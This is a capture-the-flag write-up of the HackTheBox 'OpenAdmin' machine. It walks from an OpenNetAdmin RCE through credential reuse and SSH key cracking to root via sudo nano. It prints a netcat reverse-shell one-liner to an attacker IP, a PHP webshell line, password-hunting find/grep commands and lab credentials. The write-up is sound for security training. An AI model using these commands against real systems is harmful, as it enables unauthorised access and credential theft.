# OpenAdmin — HackTheBox (write-up)

**Difficulty:** Easy
**Box:** OpenAdmin (HackTheBox)
**Author:** dkrxhn
**Date:** 2025-01-12

---

## TL;DR

### OpenNetAdmin (ONA) RCE led to a shell as `www-data`. Found database password reused for SSH as `jimmy`. Internal-only website on port 52846 revealed Joanna's encrypted SSH key. Cracked the key passphrase and SSH'd as `joanna`. Sudo nano GTFOBins for root.
---
## Target info

- Host: `10.129.90.175`
- Services discovered via nmap
---
## Enumeration

![Nmap results](images/openadmin-htb_1.png)

Found `/ona` (OpenNetAdmin):

![ONA interface](images/openadmin-htb_2.png)

![ONA version](images/openadmin-htb_3.png)

---
## Foothold

![RCE exploit](images/openadmin-htb_4.png)

Initial shell couldn't `cd`, so upgraded:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.142 4444 >/tmp/f
```

![Upgraded shell](images/openadmin-htb_5.png)

Found port 52846 running internally:

![Internal port](images/openadmin-htb_6.png)

`/var/www/internal` directory:

![Internal web root](images/openadmin-htb_7.png)

---
## Lateral movement (www-data to jimmy)

Searched for credential references:

```bash
find /etc /var/log -type f -exec grep -i "joanna" {} + 2>/dev/null
```

```bash
grep -ril "joanna" /etc /var/log 2>/dev/null
```

![grep results](images/openadmin-htb_8.png)

Joanna has a sudo file, jimmy does not.

```bash
find /etc /var/log -type f -exec grep -i "password" {} + 2>/dev/null
```

![Password search](images/openadmin-htb_9.png)

![ONA database config](images/openadmin-htb_10.png)

Found password: `xxj31ZMTZzkVA` -- didn't work anywhere directly.

![Database password](images/openadmin-htb_11.png)

Found `n1nj4W4rri0R!` in ONA config.

![SSH as jimmy](images/openadmin-htb_12.png)

```bash
ssh jimmy@10.129.90.175
# password: n1nj4W4rri0R!
```

![Jimmy shell](images/openadmin-htb_13.png)

---
## Lateral movement (jimmy to joanna)

Listed directories owned by jimmy:

```bash
find / -type d -user jimmy 2>/dev/null
```

![Jimmy's directories](images/openadmin-htb_14.png)

```bash
find / -type d -user jimmy 2>/dev/null | xargs -I {} ls -ld {}
```

![Directory permissions](images/openadmin-htb_15.png)

In `/var/www/internal`, found `main.php`:

![main.php](images/openadmin-htb_16.png)

And `index.php` with a password hash:

![index.php hash](images/openadmin-htb_17.png)

Hash: `00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1`

![Hash cracked](images/openadmin-htb_18.png)

Cracked to `Revealed`. Logged into the internal site:

![Internal login](images/openadmin-htb_19.png)

Got an encrypted SSH key. Saved as `rsa_key`.

Created a targeted wordlist and cracked:

```bash
grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja
ssh2john rsa_key > hash.txt
john --wordlist=rockyou_ninja hash.txt
```

![Key cracked](images/openadmin-htb_20.png)

Passphrase: `bloodninjas`

```bash
ssh -i rsa_key joanna@10.129.90.175
```

**Alternate path:** Could also drop a PHP webshell in `/var/www/internal` since jimmy owns it:

```bash
echo '<?php system($_GET["dank"]); ?>' > dank.php
```

![Webshell](images/openadmin-htb_21.png)

![Command execution](images/openadmin-htb_22.png)

Then trigger a reverse shell via the webshell:

![Reverse shell as joanna](images/openadmin-htb_23.png)

---
## Privesc

![sudo -l](images/openadmin-htb_24.png)

From GTFOBins for nano:

![nano GTFOBins](images/openadmin-htb_25.png)

![Root shell](images/openadmin-htb_26.png)

---
## Lessons & takeaways

- Search the entire filesystem for files containing usernames or "password" to find config files with reused creds
- Internal-only web apps (localhost-bound ports) often contain credentials or SSH keys
- Use `grep` to create a sub-wordlist from rockyou when you have a hint about the password pattern
- `find / -type d -user <username>` reveals what directories a user owns, highlighting writable locations
---
